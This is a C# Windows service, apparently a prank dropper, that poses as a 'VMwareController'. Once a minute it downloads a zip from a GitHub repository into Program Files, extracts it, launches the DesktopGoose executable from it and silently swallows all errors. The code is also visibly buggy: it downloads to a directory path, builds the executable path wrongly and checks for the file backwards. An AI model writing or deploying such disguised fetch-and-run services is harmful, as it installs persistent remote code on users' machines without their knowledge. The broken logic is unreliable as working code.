using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Net;
using System.IO;
using System.IO.Compression;


namespace VMwareController
{
    public partial class Service1 : ServiceBase
    {
        private Timer timer;

        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            timer = new Timer(60000);
            timer.Elapsed += DoCoolThing;
            timer.Start();

        }

        protected override void OnStop()
        {
            timer.Stop();
        }

        private void DoCoolThing(object sender, ElapsedEventArgs e)
        {
            try
            {
                string url = "https://github.com/burner-afk/grouse/archive/refs/heads/main.zip";
                string localPath = "C:\\Program Files";
                string extractPath = "C:\\Program Files";

                Directory.CreateDirectory(Path.GetDirectoryName(localPath));
                Directory.CreateDirectory(extractPath);

                if (!File.Exists(localPath))
                {
                    using (WebClient client = new WebClient())
                    {
                        client.DownloadFile(url, localPath);
                    }
                    

                }

                ZipFile.ExtractToDirectory(localPath, extractPath);
                File.Delete(localPath);

                string exePath = Path.Combine(extractPath, "\\grouse-main\\grouse-main\\DesktopGoose v0.31\\GooseDesktop.exe");

                if (!File.Exists(exePath))
                {
                    ProcessStartInfo psi = new ProcessStartInfo
                    {
                        FileName = exePath


                    };
                    Process.Start(psi);
                }


            }
            catch
            {

            }
            
        }
    }
}
